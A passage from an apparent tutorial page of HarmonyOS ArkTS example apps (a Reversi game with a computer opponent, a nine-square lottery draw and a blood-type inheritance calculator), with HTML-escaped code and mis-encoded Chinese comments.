reversibleTiles = this.findReversible(i, j, this.currentPlayerIsBlack ? 1 : 2); console.info(`reversibleTiles:$&#123;JSON.stringify(reversibleTiles)&#125;`); if (reversibleTiles.length &gt; 0) &#123; if (this.currentPlayerIsBlack) &#123; this.currentPlayerIsBlack = false; chessCell.showBlack(0); for (let i = 0; i &lt; reversibleTiles.length; i++) &#123; reversibleTiles[i].flip(this.transitionDuration); &#125; &#125; else &#123; this.currentPlayerIsBlack = true; if (this.isTwoPlayerMode) &#123; //åŒäººæ¸¸æˆï¼Œæ— åŠ¨ç”» chessCell.showWhite(0); for (let i = 0; i &lt; reversibleTiles.length; i++) &#123; reversibleTiles[i].flip(this.transitionDuration); &#125; &#125; else &#123; //å•äººæ¸¸æˆï¼Œè½å­éœ€è¦é—ªçƒåŠ¨ç”» this.isAIPlaying = true//AI æ­£åœ¨ä¸‹æ£‹ chessCell.showWhiteAi(this.transitionDuration, () =&gt; &#123; for (let i = 0; i &lt; reversibleTiles.length; i++) &#123; reversibleTiles[i].flip(this.transitionDuration); &#125; this.currentPlayerIsBlackChanged() this.isAIPlaying = false//AIä¸‹å®Œäº† &#125;); &#125; &#125; &#125; &#125; hasValidMoves(color: number) &#123; let hasMoves = false; for (let row = 0; row &lt; this.chessBoardSize; row++) &#123; for (let col = 0; col &lt; this.chessBoardSize; col++) &#123; if (this.chessBoard[row][col].frontVisibility === 0 &amp;&amp; this.findReversible(row, col, color).length &gt; 0) &#123; this.validMoveIndicators[row][col].isValidMove = true; hasMoves = true; &#125; else &#123; this.validMoveIndicators[row][col].isValidMove = false; &#125; &#125; &#125; return hasMoves; &#125; aboutToAppear(): void &#123; for (let i = 0; i &lt; this.chessBoardSize; i++) &#123; this.chessBoard.push([]); this.validMoveIndicators.push([]) for (let j = 0; j &lt; this.chessBoardSize; j++) &#123; this.chessBoard[i].push(new ChessCell()); this.validMoveIndicators[i].push(new TileHighlight()) &#125; &#125; this.initGame() &#125; initGame() &#123; this.currentPlayerIsBlack = true for (let i = 0; i &lt; this.chessBoardSize; i++) &#123; for (let j = 0; j &lt; this.chessBoardSize; j++) &#123; this.chessBoard[i][j].frontVisibility = 0 &#125; &#125; // åˆå§‹æ£‹ç›˜å¸ƒå±€ this.chessBoard[3][3].frontVisibility = 2; this.chessBoard[3][4].frontVisibility = 1; this.chessBoard[4][3].frontVisibility = 1; this.chessBoard[4][4].frontVisibility = 2; this.currentPlayerIsBlackChanged(); &#125; findReversible(row: number, col: number, color: number): ChessCell[] &#123; let reversibleTiles: ChessCell[] = []; const directions = [ [-1, -1], // å·¦ä¸Š [-1, 0], // æ­£ä¸Š [-1, 1], // å³ä¸Š [0, -1], // å·¦ [0, 1], // å³ [1, -1], // å·¦ä¸‹ [1, 0], // æ­£ä¸‹ [1, 1]// å³ä¸‹ ]; for (const direction of directions) &#123; let foundOpposite = false; let x = row; let y = col; do &#123; x += direction[0]; y += direction[1]; if (x &lt; 0 || y &lt; 0 || x &gt;= this.chessBoardSize || y &gt;= this.chessBoardSize) &#123; break; &#125; const cell = this.chessBoard[x][y]; if (cell.frontVisibility === 0) &#123; break; &#125; if (cell.frontVisibility === color) &#123; if (foundOpposite) &#123; let tempX: number = x - direction[0]; let tempY: number = y - direction[1]; while (tempX !== row || tempY !== col) &#123; reversibleTiles.push(this.chessBoard[tempX][tempY]); tempX -= direction[0]; tempY -= direction[1]; &#125; &#125; break; &#125; else &#123; foundOpposite = true; &#125; &#125; while (true); &#125; return reversibleTiles; &#125; determineWinner(): string &#123; let blackCount = 0; let whiteCount = 0; for (let row of this.chessBoard) &#123; for (let cell of row) &#123; if (cell.frontVisibility === 1) &#123; blackCount++; &#125; if (cell.frontVisibility === 2) &#123; whiteCount++; &#125; &#125; &#125; if (blackCount &gt; whiteCount) &#123; return &quot;é»‘æ£‹è·èƒœï¼&quot;; &#125; if (whiteCount &gt; blackCount) &#123; return &quot;ç™½æ£‹è·èƒœï¼&quot;; &#125; return &quot;å¹³å±€ï¼&quot;; &#125; hasValidMove(color: number): boolean &#123; for (let row = 0; row &lt; this.chessBoardSize; row++) &#123; for (let col = 0; col &lt; this.chessBoardSize; col++) &#123; if (this.chessBoard[row][col].frontVisibility === 0 &amp;&amp; this.findReversible(row, col, color).length &gt; 0) &#123; return true; &#125; &#125; &#125; return false; &#125; build() &#123; Column(&#123; space: 20 &#125;) &#123; Row() &#123; Row() &#123; Text(``)// æ˜¾ç¤ºå•å…ƒæ ¼çš„å€¼æˆ–ç©ºå­—ç¬¦ä¸² .width(`$&#123;this.cellSize&#125;lpx`)// è®¾ç½®å®½åº¦ .height(`$&#123;this.cellSize&#125;lpx`)// è®¾ç½®é«˜åº¦ .textAlign(TextAlign.Center)// æ–‡æœ¬å±…ä¸­ .backgroundColor(Color.Black)// è®¾ç½®èƒŒæ™¯é¢œè‰² .borderRadius(&#x27;50%&#x27;)// è®¾ç½®åœ†è§’ .padding(10) Text(`é»‘æ£‹è¡ŒåŠ¨`) .fontColor(Color.White) .padding(10) &#125; .visibility(this.currentPlayerIsBlack ? Visibility.Visible : Visibility.Hidden) Row() &#123; Text(`ç™½æ£‹è¡ŒåŠ¨`) .fontColor(Color.White) .padding(10) Text()// æ˜¾ç¤ºå•å…ƒæ ¼çš„å€¼æˆ–ç©ºå­—ç¬¦ä¸² .width(`$&#123;this.cellSize&#125;lpx`)// è®¾ç½®å®½åº¦ .height(`$&#123;this.cellSize&#125;lpx`)// è®¾ç½®é«˜åº¦ .textAlign(TextAlign.Center)// æ–‡æœ¬å±…ä¸­ .backgroundColor(Color.White)// è®¾ç½®èƒŒæ™¯é¢œè‰² .fontColor(Color.White) .borderRadius(&#x27;50%&#x27;)// è®¾ç½®åœ†è§’ .padding(10) &#125; .visibility(!this.currentPlayerIsBlack ? Visibility.Visible : Visibility.Hidden) &#125; .width(`$&#123;(this.cellSize + this.cellSpacing * 2) * 8&#125;lpx`) // è®¾ç½®å®½åº¦ .justifyContent(FlexAlign.SpaceBetween) .margin(&#123; top: 20 &#125;) Stack() &#123; //æ£‹ç›˜èƒŒæ™¯ Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; ForEach(this.validMoveIndicators, (row: boolean[], _rowIndex: number) =&gt; &#123; ForEach(row, (item: TileHighlight, _colIndex: number) =&gt; &#123; Text(`$&#123;item.isValidMove ? &#x27;+&#x27; : &#x27;&#x27;&#125;`)// æ˜¾ç¤ºå•å…ƒæ ¼çš„å€¼æˆ–ç©ºå­—ç¬¦ä¸² .width(`$&#123;this.cellSize&#125;lpx`)// è®¾ç½®å®½åº¦ .height(`$&#123;this.cellSize&#125;lpx`)// è®¾ç½®é«˜åº¦ .margin(`$&#123;this.cellSpacing&#125;lpx`) .fontSize(`$&#123;this.cellSize / 2&#125;lpx`)// è®¾ç½®å­—ä½“å¤§å° .fontColor(Color.White) .textAlign(TextAlign.Center)// æ–‡æœ¬å±…ä¸­ .backgroundColor(Color.Gray)// è®¾ç½®èƒŒæ™¯é¢œè‰² .borderRadius(2) // è®¾ç½®åœ†è§’ &#125;); &#125;); &#125; .width(`$&#123;(this.cellSize + this.cellSpacing * 2) * 8&#125;lpx`) // è®¾ç½®å®½åº¦ //æ£‹å­ Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; ForEach(this.chessBoard, (row: ChessCell[], rowIndex: number) =&gt; &#123; ForEach(row, (chessCell: ChessCell, colIndex: number) =&gt; &#123; Text(``)// æ˜¾ç¤ºå•å…ƒæ ¼çš„å€¼æˆ–ç©ºå­—ç¬¦ä¸² .width(`$&#123;this.cellSize&#125;lpx`)// è®¾ç½®å®½åº¦ .height(`$&#123;this.cellSize&#125;lpx`)// è®¾ç½®é«˜åº¦ .margin(`$&#123;this.cellSpacing&#125;lpx`)// è®¾ç½®è¾¹è· .fontSize(`$&#123;this.cellSize / 2&#125;lpx`)// è®¾ç½®å­—ä½“å¤§å° .textAlign(TextAlign.Center)// æ–‡æœ¬å±…ä¸­ .opacity(chessCell.opacity) .backgroundColor(chessCell.frontVisibility != 0 ? (chessCell.frontVisibility === 1 ? Color.Black : Color.White) : Color.Transparent)// è®¾ç½®èƒŒæ™¯é¢œè‰² .borderRadius(&#x27;50%&#x27;)// è®¾ç½®åœ†è§’ .rotate(&#123; // è®¾ç½®æ—‹è½¬ x: 0, y: 1, z: 0, angle: chessCell.rotationAngle, // æ—‹è½¬è§’åº¦ centerX: `$&#123;this.cellSize / 2&#125;lpx`, // ä¸­å¿ƒç‚¹Xåæ ‡ centerY: `$&#123;this.cellSize / 2&#125;lpx`, // ä¸­å¿ƒç‚¹Yåæ ‡ &#125;) .onClick(() =&gt; &#123; // å•å‡»äº‹ä»¶å¤„ç† if (this.isAIPlaying) &#123; console.info(`aiæ­£åœ¨è½å­ï¼Œç©å®¶ä¸å¯ç»§ç»­è½å­`) return; &#125; if (chessCell.frontVisibility === 0) &#123; // æ²¡æœ‰æ£‹å­ï¼Œéœ€è¦è½å­ this.placeChessPiece(rowIndex, colIndex, chessCell) &#125; &#125;); &#125;); &#125;); &#125; .width(`$&#123;(this.cellSize + this.cellSpacing * 2) * 8&#125;lpx`) // è®¾ç½®å®½åº¦ &#125; .padding(`$&#123;this.cellSpacing&#125;lpx`) .backgroundColor(Color.Black) Row() &#123; Text(`$&#123;this.isTwoPlayerMode? &#x27;åŒäººæ¸¸æˆ&#x27; : &#x27;å•äººæ¸¸æˆ&#x27;&#125;`) .height(50) .padding(&#123; left: 10 &#125;) .fontSize(16) .textAlign(TextAlign.Start) .backgroundColor(0xFFFFFF) Toggle(&#123; type: ToggleType.Switch, isOn: this.isTwoPlayerMode &#125;) .margin(&#123; left: 200, right: 10 &#125;) .onChange((isOn: boolean) =&gt; &#123; this.isTwoPlayerMode = isOn &#125;) &#125; .backgroundColor(0xFFFFFF) .borderRadius(5) Button(&#x27;é‡æ–°å¼€å§‹&#x27;).onClick(() =&gt; &#123; // æŒ‰é’®ç‚¹å‡»äº‹ä»¶ this.initGame() &#125;); &#125; .height(&#x27;100%&#x27;).width(&#x27;100%&#x27;) // è®¾ç½®é«˜åº¦å’Œå®½åº¦ .backgroundColor(Color.Orange) &#125;&#125; nine-squareä¹å®«æ ¼æŠ½å¥– 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186// å®šä¹‰ä¸€ä¸ªå¯è§‚å¯Ÿçš„Prizeç±»ï¼Œç”¨äºè¡¨ç¤ºå¥–å“ä¿¡æ¯ã€‚@ObservedV2class Prize &#123; @Trace title: string // å¥–å“æ ‡é¢˜å±æ€§ï¼Œä½¿ç”¨@Traceè¿›è¡Œè¿½è¸ªä»¥ä¾¿å“åº”å¼æ›´æ–°UI @Trace color: string // å¥–å“é¢œè‰²å±æ€§ @Trace description: string // å¥–å“æè¿°å±æ€§ // æ„é€ å‡½æ•°ï¼Œç”¨æ¥åˆå§‹åŒ–æ–°çš„å¥–å“å®ä¾‹ constructor(title: string, color: string, description: string = &quot;&quot;) &#123; this.title = title // è®¾ç½®å¥–å“æ ‡é¢˜ this.color = color // è®¾ç½®å¥–å“é¢œè‰² this.description = description // è®¾ç½®å¥–å“æè¿°ï¼Œé»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸² &#125;&#125; // å®šä¹‰MyPrizeUpdateç»“æ„ç»„ä»¶ï¼Œç”¨äºæ˜¾ç¤ºå’Œç¼–è¾‘é€‰ä¸­çš„å¥–å“ä¿¡æ¯@Componentstruct MyPrizeUpdate &#123; @Consume selectedIndex: number // å½“å‰é€‰ä¸­çš„å¥–å“ç´¢å¼• @Consume private selectionOrder: number[] // ä¿å­˜æŠ½å¥–é¡ºåºçš„æ•°ç»„ @Consume private prizeArray: Prize[] // ä¿å­˜æ‰€æœ‰å¥–å“çš„æ•°ç»„ build() &#123; Column(&#123; space: 20 &#125;) &#123; // åˆ›å»ºåˆ—å¸ƒå±€å®¹å™¨ï¼Œè®¾ç½®å­å…ƒç´ ä¹‹é—´çš„é—´è·ä¸º20px Row() &#123; // åˆ›å»ºè¡Œå¸ƒå±€å®¹å™¨ Text(&#x27;æ ‡é¢˜ï¼š&#x27;) // æ˜¾ç¤ºâ€œæ ‡é¢˜â€æ–‡æœ¬ TextInput(&#123; text: this.prizeArray[this.selectionOrder[this.selectedIndex%this.selectionOrder.length]].title &#125;) .width(&#x27;300lpx&#x27;) // è®¾ç½®è¾“å…¥æ¡†å®½åº¦ .onChange((value) =&gt; &#123; // ç›‘å¬è¾“å…¥æ¡†å†…å®¹å˜åŒ– this.prizeArray[this.selectionOrder[this.selectedIndex%this.selectionOrder.length]].title = value // æ›´æ–°å¥–å“æ ‡é¢˜ &#125;) &#125; Row() &#123; Text(&#x27;æè¿°ï¼š&#x27;) TextInput(&#123; text: `$&#123;this.prizeArray[this.selectionOrder[this.selectedIndex%this.selectionOrder.length]].description&#125;` &#125;).width(&#x27;300lpx&#x27;).onChange((value) =&gt; &#123; // åŒä¸Šï¼Œä½†é’ˆå¯¹å¥–å“æè¿° this.prizeArray[this.selectionOrder[this.selectedIndex%this.selectionOrder.length]].description = value &#125;) &#125; Row() &#123; Text(&#x27;é¢œè‰²ï¼š&#x27;) TextInput(&#123; text: `$&#123;this.prizeArray[this.selectionOrder[this.selectedIndex%this.selectionOrder.length]].color&#125;` &#125;).width(&#x27;300lpx&#x27;).onChange((value) =&gt; &#123; // åŒä¸Šï¼Œä½†é’ˆå¯¹å¥–å“é¢œè‰² this.prizeArray[this.selectionOrder[this.selectedIndex%this.selectionOrder.length]].color = value &#125;) &#125; &#125; .justifyContent(FlexAlign.Start) // è®¾ç½®å†…å®¹å·¦å¯¹é½ .padding(40) // è®¾ç½®å†…è¾¹è· .width(&#x27;100%&#x27;) // è®¾ç½®å®½åº¦ä¸º100% .backgroundColor(Color.White) // è®¾ç½®èƒŒæ™¯é¢œè‰²ä¸ºç™½è‰² &#125;&#125; // å®šä¹‰æŠ½å¥–é¡µé¢å…¥å£ç»„ä»¶@Entry@Componentstruct LotteryPage &#123; @Provide private selectedIndex: number = 0 // æä¾›å½“å‰é€‰ä¸­çš„ç´¢å¼•ï¼Œåˆå§‹å€¼ä¸º0 private isAnimating: boolean = false // æ ‡è®°æ˜¯å¦æ­£åœ¨è¿›è¡ŒåŠ¨ç”»ï¼Œåˆå§‹å€¼ä¸ºfalse @Provide private selectionOrder: number[] = [0, 1, 2, 5, 8, 7, 6, 3] // å®šä¹‰æŠ½å¥–é¡ºåº private cellWidth: number = 200 // å•å…ƒæ ¼å®½åº¦ private baseMargin: number = 10 // å•å…ƒæ ¼è¾¹è· @Provide private prizeArray: Prize[] = [ new Prize(&quot;çº¢åŒ…&quot;, &quot;#ff9675&quot;, &quot;10å…ƒ&quot;), // åˆå§‹åŒ–å¥–å“æ•°ç»„ï¼Œåˆ›å»ºå„ç§å¥–å“å¯¹è±¡ new Prize(&quot;è¯è´¹&quot;, &quot;#ff9f2e&quot;, &quot;5å…ƒ&quot;), new Prize(&quot;çº¢åŒ…&quot;, &quot;#8e7fff&quot;, &quot;50å…ƒ&quot;), new Prize(&quot;çº¢åŒ…&quot;, &quot;#48d1ea&quot;, &quot;30å…ƒ&quot;), new Prize(&quot;å¼€å§‹æŠ½å¥–&quot;, &quot;#fffdfd&quot;), // æŠ½å¥–æŒ‰é’®ï¼Œæ²¡æœ‰å…·ä½“å¥–å“æè¿° new Prize(&quot;è°¢è°¢å‚ä¸&quot;, &quot;#5f5f5f&quot;), new Prize(&quot;è°¢è°¢å‚ä¸&quot;, &quot;#5f5f5f&quot;), new Prize(&quot;è¶…å¸‚çº¢åŒ…&quot;, &quot;#5f5f5f&quot;, &quot;100å…ƒ&quot;), new Prize(&quot;é²œèŠ±&quot;, &quot;#75b0fe&quot;), ] private intervalID: number = 0 // å®šæ—¶å™¨IDï¼Œç”¨äºæ§åˆ¶æŠ½å¥–é€Ÿåº¦ @State isSheetVisible: boolean = false // æ§åˆ¶åº•éƒ¨å¼¹å‡ºè¡¨å•çš„å¯è§æ€§ // å¼€å§‹æŠ½å¥–é€»è¾‘ startLottery(speed: number = 500) &#123; setTimeout(() =&gt; &#123; // è®¾ç½®å»¶æ—¶æ‰§è¡Œ if (speed &gt; 50) &#123; // å¦‚æœé€Ÿåº¦å¤§äº50ï¼Œåˆ™é€’å½’è°ƒç”¨startLotteryä»¥é€æ¸åŠ é€Ÿ speed -= 50 this.startLottery(speed) &#125; else &#123; this.runAtConstantSpeed() // è¾¾åˆ°æœ€é«˜é€Ÿåº¦åè¿›å…¥åŒ€é€Ÿé˜¶æ®µ return &#125; this.selectedIndex++ // æ¯æ¬¡è°ƒç”¨æ—¶æ›´æ–°é€‰ä¸­ç´¢å¼• &#125;, speed) &#125; // ä»¥æ’å®šé€Ÿåº¦è¿è¡ŒæŠ½å¥– runAtConstantSpeed() &#123; let speed = 40 + Math.floor(Math.random() * this.selectionOrder.length) // éšæœºç”Ÿæˆä¸€ä¸ªé€Ÿåº¦å€¼ clearInterval(this.intervalID) // æ¸…é™¤ä¹‹å‰çš„å®šæ—¶å™¨ this.intervalID = setInterval(() =&gt; &#123; // è®¾ç½®æ–°çš„å®šæ—¶å™¨æ¥æ›´æ–°é€‰ä¸­ç´¢å¼• if (this.selectedIndex &gt;= speed) &#123; // å¦‚æœé€‰ä¸­ç´¢å¼•è¾¾åˆ°é€Ÿåº¦å€¼ï¼Œåœæ­¢å¹¶è¿›å…¥å‡é€Ÿé˜¶æ®µ clearInterval(this.intervalID) this.slowDown() return &#125; this.selectedIndex++ &#125;, 50) &#125; // å‡é€Ÿé€»è¾‘ slowDown(speed = 50) &#123; setTimeout(() =&gt; &#123; // è®¾ç½®å»¶æ—¶æ‰§è¡Œ if (speed &lt; 500) &#123; // å¦‚æœé€Ÿåº¦å°äº500ï¼Œåˆ™é€’å½’è°ƒç”¨slowDownä»¥é€æ¸å‡é€Ÿ speed += 50 this.slowDown(speed) &#125; else &#123; this.selectedIndex %= this.selectionOrder.length // ç¡®ä¿ç´¢å¼•åœ¨æœ‰æ•ˆèŒƒå›´å†… let index = this.selectionOrder[this.selectedIndex] // è·å–æœ€ç»ˆé€‰ä¸­çš„å¥–å“ç´¢å¼• this.isAnimating = false // åŠ¨ç”»ç»“æŸ this.getUIContext().showAlertDialog(&#123; // æ˜¾ç¤ºç»“æœå¯¹è¯æ¡† title: &#x27;ç»“æœ&#x27;, message: `$&#123;this.prizeArray[index].title&#125;$&#123;this.prizeArray[index].description&#125;`, // æ˜¾ç¤ºå¥–å“ä¿¡æ¯ confirm: &#123; defaultFocus: true, value: &#x27;æˆ‘çŸ¥é“äº†&#x27;, // ç¡®è®¤æŒ‰é’®æ–‡æœ¬ action: () =&gt; &#123;&#125; // ç‚¹å‡»ç¡®è®¤åçš„æ“ä½œ &#125;, alignment: DialogAlignment.Center, &#125;); return &#125; this.selectedIndex++ &#125;, speed) &#125; // æ„å»ºUIæ–¹æ³• build() &#123; Column() &#123; // ä½¿ç”¨Columnå¸ƒå±€å®¹å™¨ Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; // ä½¿ç”¨å¼¹æ€§å¸ƒå±€ï¼Œå…è®¸æ¢è¡Œ ForEach(this.prizeArray, (item: Prize, index: number) =&gt; &#123; // éå†å¥–å“æ•°ç»„ï¼Œåˆ›å»ºæ¯ä¸ªå¥–å“çš„UI Column() &#123; // ä½¿ç”¨Columnå¸ƒå±€å®¹å™¨ä¸ºæ¯ä¸ªå¥–å“é¡¹ Text(`$&#123;item.title&#125;`) // æ˜¾ç¤ºå¥–å“æ ‡é¢˜ .fontColor(index == 4 ? Color.White : item.color) // è®¾ç½®å­—ä½“é¢œè‰²ï¼Œå¯¹äºæŠ½å¥–æŒ‰é’®ç‰¹æ®Šå¤„ç† .fontSize(16) Text(`$&#123;item.description&#125;`) // æ˜¾ç¤ºå¥–å“æè¿° .fontColor(index == 4 ? Color.White : item.color) // è®¾ç½®å­—ä½“é¢œè‰² .fontSize(20) &#125; .clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;) // æ·»åŠ ç‚¹å‡»æ•ˆæœ .onClick(() =&gt; &#123; // å¤„ç†ç‚¹å‡»äº‹ä»¶ if (this.isAnimating) &#123; // å¦‚æœæ­£åœ¨åŠ¨ç”»ä¸­ï¼Œå¿½ç•¥ç‚¹å‡» return &#125; if (index == 4) &#123; // å¦‚æœç‚¹å‡»çš„æ˜¯æŠ½å¥–æŒ‰é’®ï¼Œå¼€å§‹æŠ½å¥– this.isAnimating = true this.startLottery() &#125; else &#123; for (let i = 0; i &lt; this.selectionOrder.length; i++) &#123; if (this.selectionOrder[i] == index) &#123; this.selectedIndex = i // æ›´æ–°é€‰ä¸­ç´¢å¼•åˆ°å¯¹åº”ä½ç½® &#125; &#125; &#125; &#125;) .alignItems(HorizontalAlign.Center) // è®¾ç½®æ°´å¹³å±…ä¸­å¯¹é½ .justifyContent(FlexAlign.Center) // è®¾ç½®å‚ç›´å±…ä¸­å¯¹é½ .width(`$&#123;this.cellWidth&#125;lpx`) // è®¾ç½®å•å…ƒæ ¼å®½åº¦ .height(`$&#123;this.cellWidth&#125;lpx`) // è®¾ç½®å•å…ƒæ ¼é«˜åº¦ .margin(`$&#123;this.baseMargin&#125;lpx`) // è®¾ç½®å•å…ƒæ ¼è¾¹è· .backgroundColor(index == 4 ? &quot;#ff5444&quot; : // æŠ½å¥–æŒ‰é’®èƒŒæ™¯é¢œè‰²ç‰¹æ®Šå¤„ç† (this.selectionOrder[this.selectedIndex % this.selectionOrder.length] == index ? Color.Gray : Color.White)) .borderRadius(10) // è®¾ç½®åœ†è§’ .shadow(&#123; // è®¾ç½®é˜´å½±æ•ˆæœ radius: 10, color: &quot;#f98732&quot;, offsetX: 0, offsetY: 20 &#125;) &#125;) &#125;.width(`$&#123;this.cellWidth * 3 + this.baseMargin * 6&#125;lpx`) // è®¾ç½®æ•´ä½“å®½åº¦ .margin(&#123; top: 30 &#125;) // è®¾ç½®é¡¶éƒ¨è¾¹è· MyPrizeUpdate().margin(&#123;top:20&#125;) // æ’å…¥MyPrizeUpdateç»„ä»¶ï¼Œå¹¶è®¾ç½®å…¶ä¸Šè¾¹è· &#125; .height(&#x27;100%&#x27;) // è®¾ç½®é«˜åº¦ä¸º100% .width(&#x27;100%&#x27;) // è®¾ç½®å®½åº¦ä¸º100% .backgroundColor(&quot;#ffb350&quot;) // è®¾ç½®é¡µé¢èƒŒæ™¯é¢œè‰² &#125;&#125; LotteryPageå…¥å£ç»„ä»¶LotteryPageæ˜¯æ•´ä¸ªæŠ½å¥–åº”ç”¨çš„æ ¸å¿ƒç»„ä»¶ï¼Œè´Ÿè´£ç»„ç»‡é¡µé¢å¸ƒå±€å’Œå¤„ç†ç”¨æˆ·äº¤äº’é€»è¾‘ã€‚å®ƒåˆå§‹åŒ–äº†ä¸€ç³»åˆ—å¿…è¦çš„çŠ¶æ€å˜é‡ï¼Œæ¯”å¦‚ä¿å­˜æ‰€æœ‰å¥–å“çš„æ•°ç»„prizeArrayã€å®šä¹‰æŠ½å¥–é¡ºåºçš„selectionOrderä»¥åŠæ§åˆ¶åŠ¨ç”»çŠ¶æ€çš„isAnimatingç­‰ã€‚æ­¤å¤–ï¼Œè¯¥ç»„ä»¶å®ç°äº†æŠ½å¥–è¿‡ç¨‹çš„å…³é”®æ–¹æ³•â€”â€”startLotteryï¼ˆå¼€å§‹æŠ½å¥–ï¼‰ã€runAtConstantSpeedï¼ˆåŒ€é€Ÿè¿è¡Œï¼‰å’ŒslowDownï¼ˆå‡é€Ÿï¼‰ï¼Œå®ƒä»¬å…±åŒåä½œä»¥æ¨¡æ‹ŸçœŸå®çš„æŠ½å¥–ä½“éªŒã€‚å½“ç”¨æˆ·ç‚¹å‡»æŠ½å¥–æŒ‰é’®æ—¶ï¼Œè¿™äº›æ–¹æ³•æŒ‰ç…§é¢„å®šçš„é€Ÿåº¦æ¨¡å¼ä¾æ¬¡è°ƒç”¨ï¼Œç›´åˆ°æœ€ç»ˆç¡®å®šä¸€ä¸ªå¥–å“ä¸ºæ­¢ã€‚æœ€åï¼Œé€šè¿‡å¼¹å‡ºå¯¹è¯æ¡†çš„æ–¹å¼å‘ç”¨æˆ·å±•ç¤ºæŠ½å¥–ç»“æœã€‚ bloodè¡€å‹è®¡ç®— 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204// å¯¼å…¥SegmentButtonåŠå…¶ç›¸å…³ç±»å‹å®šä¹‰import &#123; SegmentButton, SegmentButtonItemTuple, SegmentButtonOptions &#125; from &#x27;@kit.ArkUI&#x27;; // ä½¿ç”¨@Entryè£…é¥°å™¨æ ‡è®°æ­¤ç»„ä»¶ä¸ºå…¥å£ç‚¹@Entry // ä½¿ç”¨@Componentè£…é¥°å™¨æ ‡è®°æ­¤ç»“æ„ä½“ä¸ºä¸€ä¸ªç»„ä»¶@Component // å®šä¹‰ä¸€ä¸ªåä¸ºBloodTypeCalculatorçš„ç»“æ„ä½“ï¼Œç”¨äºå®ç°è¡€å‹é—ä¼ è®¡ç®—åŠŸèƒ½struct BloodTypeCalculator &#123; // å®šä¹‰ä¸»é¢˜é¢œè‰²ï¼Œé»˜è®¤ä¸ºæ©™è‰² @State private themeColor: string | Color = Color.Orange; // å®šä¹‰æ–‡æœ¬é¢œè‰²ï¼Œé»˜è®¤ä¸ºæ·±ç°è‰² @State private textColor: string = &quot;#2e2e2e&quot;; // å®šä¹‰è¾¹æ¡†é¢œè‰²ï¼Œé»˜è®¤ä¸ºæµ…ç°è‰² @State private lineColor: string = &quot;#d5d5d5&quot;; // å®šä¹‰åŸºç¡€å†…è¾¹è·å¤§å°ï¼Œé»˜è®¤ä¸º30 @State private basePadding: number = 30; // å­˜å‚¨å¯èƒ½çš„è¡€å‹ç»“æœ @State private possibleBloodTypesText: string = &quot;&quot;; // å­˜å‚¨ä¸å¯èƒ½çš„è¡€å‹ç»“æœ @State private impossibleBloodTypesText: string = &quot;&quot;; // å®šä¹‰è¡€å‹åˆ—è¡¨ï¼ŒåŒ…å«Aã€Bã€ABã€Oå››ç§è¡€å‹ @State private bloodTypeList: object[] = [Object(&#123; text: &#x27;A&#x27; &#125;), Object(&#123; text: &#x27;B&#x27; &#125;), Object(&#123; text: &#x27;AB&#x27; &#125;), Object(&#123; text: &#x27;O&#x27; &#125;)]; // åˆå§‹åŒ–å•é€‰èƒ¶å›ŠæŒ‰é’®çš„é…ç½®é¡¹ @State singleSelectCapsuleOptions: SegmentButtonOptions | undefined = undefined; // ç›‘å¬çˆ¶äº²è¡€å‹é€‰æ‹©å˜åŒ– @State @Watch(&#x27;capsuleSelectedIndexesChanged&#x27;) fatherBloodTypeIndex: number[] = [0]; // ç›‘å¬æ¯äº²è¡€å‹é€‰æ‹©å˜åŒ– @State @Watch(&#x27;capsuleSelectedIndexesChanged&#x27;) motherBloodTypeIndex: number[] = [0]; // æ ¹æ®è¡€å‹è·å–å…¶å¯èƒ½çš„åŸºå› ç»„åˆ getGenes(bloodType: string): string[] &#123; console.info(`bloodType:$&#123;bloodType&#125;`); switch (bloodType) &#123; case &#x27;A&#x27;: return [&#x27;A&#x27;, &#x27;O&#x27;]; // Aå‹è¡€å¯èƒ½çš„åŸºå› ç»„åˆ case &#x27;B&#x27;: return [&#x27;B&#x27;, &#x27;O&#x27;]; // Bå‹è¡€å¯èƒ½çš„åŸºå› ç»„åˆ case &#x27;AB&#x27;: return [&#x27;A&#x27;, &#x27;B&#x27;]; // ABå‹è¡€å¯èƒ½çš„åŸºå› ç»„åˆ case &#x27;O&#x27;: return [&#x27;O&#x27;]; // Oå‹è¡€å¯èƒ½çš„åŸºå› ç»„åˆ default: throw new Error(&#x27;Invalid blood type&#x27;); // éæ³•è¡€å‹æŠ›å‡ºé”™è¯¯ &#125; &#125; // ç»„åˆçˆ¶æ¯çš„åŸºå› ä»¥è·å¾—å­ä»£å¯èƒ½çš„åŸºå› ç»„åˆ combineGenes(fatherGenes: string[], motherGenes: string[]): string[] &#123; const possibleGenes: string[] = []; // ç”¨äºå­˜å‚¨å¯èƒ½çš„åŸºå› ç»„åˆ for (const fatherGene of fatherGenes) &#123; for (const motherGene of motherGenes) &#123; const combinedGene = [fatherGene, motherGene].sort().join(&#x27;&#x27;); // å°†çˆ¶æ¯çš„åŸºå› ç»„åˆå¹¶æ’åºååŠ å…¥æ•°ç»„ if (!possibleGenes.includes(combinedGene)) &#123; possibleGenes.push(combinedGene); // å¦‚æœç»„åˆå°šæœªå­˜åœ¨ï¼Œåˆ™åŠ å…¥æ•°ç»„ &#125; &#125; &#125; return possibleGenes; // è¿”å›æ‰€æœ‰å¯èƒ½çš„åŸºå› ç»„åˆ &#125; // æ ¹æ®åŸºå› ç»„åˆç¡®å®šè¡€å‹ getBloodTypesFromGenes(genes: string[]): string[] &#123; const bloodTypes: string[] = []; // ç”¨äºå­˜å‚¨å¯èƒ½çš„è¡€å‹ for (const gene of genes) &#123; if (gene === &#x27;AA&#x27; || gene === &#x27;AO&#x27; || gene === &#x27;OA&#x27;) &#123; bloodTypes.push(&#x27;A&#x27;); // åŸºå› ç»„åˆä¸ºAAã€AOæˆ–OAæ—¶ï¼Œè¡€å‹ä¸ºA &#125; else if (gene === &#x27;BB&#x27; || gene 